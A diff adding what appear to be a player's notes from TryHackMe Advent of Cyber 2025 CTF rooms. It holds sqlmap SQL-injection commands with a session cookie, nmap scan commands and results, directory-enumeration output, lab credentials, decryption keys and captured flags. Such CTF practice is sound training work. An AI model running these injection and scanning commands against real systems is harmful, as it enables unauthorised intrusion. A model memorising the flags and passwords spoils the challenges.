@@ -1,0 +1,122 @@
+sqlmap -r '/home/kali/Documents/Burplogs/post_req_burp.txt' -A "Mozilla/4.2" -v5 --cookie="ASP.NET_SessionId=bbli3do3f0edtnw5qsuxafqh" -a --dbms=mssql --dbs --technique=E,B -p "ctl00%24MainContent%24txtFilterUserName" 
+
+sqlmap -u '/home/kali/Documents/Burplogs/post_req_burp.txt' -A "Mozilla/4.2" -v5 --cookie="ASP.NET_SessionId=bbli3do3f0edtnw5qsuxafqh" -a --dbms=mssql --dbs --technique=E,B -p "ctl00%24MainContent%24txtFilterUserName" 
+
+SQL Injection:
+In-Band (Classic)
+   - Error
+   - Union
+Inferential (Blind)
+   -Boolean
+   -TIme
+Out-of-band
+
+sqlmap -r '/home/kali/Documents/Burplogs/post_req_burp.txt' -A "Mozilla/4.2" -v6 --cookie="ASP.NET_SessionId=bbli3do3f0edtnw5qsuxafqh" -a --dbms=mssql --dbs -p "ctl00%24MainContent%24txtFilterUserName" --level=5 --risk=5
+
+
+3ast3r-1s-c0M1nG
+
+username: eddi_knapp
+password: S0mething1Sc0ming
+
+Your identification has been saved in /etc/ssh/ssh_host_ed25519_key
+Nov 30 17:58:04 tbfc-web01 cloud-init[700]: Your public key has been saved in /etc/ssh/ssh_host_ed25519_key.pub
+Nov 30 17:58:04 tbfc-web01 cloud-init[700]: The key fingerprint is:
+Nov 30 17:58:04 tbfc-web01 cloud-init[700]: SHA256:EPrkS7Akid8UdQGpYEgG6O6pNOwoaAyhBj44pXUfy4k root@tbfc-web01
+
+image download list:
+- wallpaper_spring.png
+- family_holiday.jpg
+- profile_pic.png
+- scenery_01.png
+
+Below is the list that should be live on the site. If you replace the contents of
+/home/socmas/2025/wishlist.txt with this exact list (one item per line, no numbering),
+the site will recognise it and the takeover glitching will stop. Do it — it will save the site.
+
+Hardware security keys (YubiKey or similar)
+Commercial password manager subscriptions (team seats)
+Endpoint detection & response (EDR) licenses
+Secure remote access appliances (jump boxes)
+Cloud workload scanning credits (container/image scanning)
+Threat intelligence feed subscription
+
+Secure code review / SAST tool access
+Dedicated secure test lab VM pool
+Incident response runbook templates and playbooks
+Electronic safe drive with encrypted backups
+
+A final note — I don't know exactly where they have me, but there are *lots* of eggs
+and I can smell chocolate in the air. Something big is coming.  — McSkidy
+
+---
+
+When the wishlist is corrected, the site will show a block of ciphertext. This ciphertext can be decrypted with the following unlock key:
+
+UNLOCK_KEY: 91J6X7R4FQ9TQPM9JX2Q9X2Z
+
+To decode the ciphertext, use OpenSSL. For instance, if you copied the ciphertext into a file /tmp/website_output.txt you could decode using the following command:
+
+cat > /tmp/website_output.txt
+openssl enc -d -aes-256-cbc -pbkdf2 -iter 200000 -salt -base64 -in /tmp/website_output.txt -out /tmp/decoded_message.txt -pass pass:'91J6X7R4FQ9TQPM9JX2Q9X2Z'
+cat /tmp/decoded_message.txt
+
+Sorry to be so convoluted, I couldn't risk making this easy while King Malhare watches. — McSkidy
+
+Chocolate egg assortments (assorted sizes and flavours)
+Hand-painted decorative Easter eggs
+Easter basket with plush toys and treats
+Seasonal flower bouquet (tulips & daffodils)
+Bunny-themed cookie gift boxes
+Spring picnic hamper with pastel treats
+DIY egg-decorating kit with paints and stencils
+Ceramic egg display stand for mantels
+Easter egg hunt supply pack (egg fillers & clues)
+Pastel ribbon and wrapping set for gifts
+
+tail .easter_egg
+
+cat /tmp/decoded_message.txt 
+Well done — the glitch is fixed. Amazing job going the extra mile and saving the site. Take this flag THM{w3lcome_2_A0c_2025}
+
+NEXT STEP:
+If you fancy something a little...spicier....use the FLAG you just obtained as the passphrase to unlock:
+/home/eddi_knapp/.secret/dir
+
+That hidden directory has been archived and encrypted with the FLAG.
+Inside it you'll find the sidequest key.
+
+sudo gpg -d --output dir.tar.gz dir.tar.gz.gpg
+
+gzip -d dir.tar.gz
+
+tar -xf dir.tar
+
+
+PORT      STATE SERVICE    REASON
+8000/tcp  open  http-alt   syn-ack
+9001/tcp  open  tor-orport syn-ack
+13400/tcp open  doip-data  syn-ack
+13401/tcp open  unknown    syn-ack
+13402/tcp open  unknown    syn-ack
+13403/tcp open  unknown    syn-ack
+13404/tcp open  unknown    syn-ack
+21337/tcp open  unknown    syn-ack
+80
+
+/cgi-bin              (Status: 301) [Size: 178] [--> http://10.82.147.208/cgi-bin/]
+/index.html           (Status: 200) [Size: 19522]
+/index.html           (Status: 200) [Size: 19522]
+/success.html         (Status: 200) [Size: 179]
+
+Access Granted
+
+THM{ACCESS_PLACEHOLDER_FLAG}
+
+guard.hopkins@hopsecasylum.com
+
+document.getElementById("escapeDoor")
+
+nmap -vvvvv -p 1-24000 -sU [Ip or domain] // udp scan
+nmap -vvvvv -p 1-24000 -sA [Ip or domain] // tcp ack scan
+nmap -vvvvv -p 1-24000 -sS [Ip or domain] // tcp syn scan
